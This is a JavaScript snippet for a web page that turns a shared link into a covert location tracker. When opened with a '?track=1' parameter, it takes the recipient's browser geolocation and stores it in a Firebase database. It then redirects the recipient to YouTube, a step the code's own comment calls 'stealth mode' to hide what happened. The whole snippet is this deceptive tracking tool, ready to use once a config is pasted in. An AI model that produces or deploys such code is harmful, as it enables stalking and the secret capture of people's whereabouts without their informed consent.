<script>
    // Initialize the map (centered on a random location)
    const map = L.map('map').setView([51.505, -0.09], 13);

    // Add OpenStreetMap tiles
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
    }).addTo(map);

    // Firebase setup (paste your config here)
    const firebaseConfig = {
        apiKey: "YOUR_API_KEY",
        authDomain: "YOUR_PROJECT.firebaseapp.com",
        databaseURL: "https://YOUR_PROJECT.firebaseio.com",
        projectId: "YOUR_PROJECT",
        storageBucket: "YOUR_PROJECT.appspot.com",
        messagingSenderId: "YOUR_SENDER_ID",
        appId: "YOUR_APP_ID"
    };
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    // Check if this is a tracking link (?track=1)
    const urlParams = new URLSearchParams(window.location.search);
    const isTracking = urlParams.get('track');

    if (isTracking) {
        // Get the recipient's location
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                
                // Save to Firebase
                database.ref('locations/' + Date.now()).set({
                    lat: lat,
                    lng: lng,
                    member: "Unknown"
                });

                // Redirect to YouTube (stealth mode)
                window.location.href = "https://youtube.com";
            },
            (error) => {
                console.error("Error getting location:", error);
                window.location.href = "https://youtube.com";
            }
        );
    }
</script>
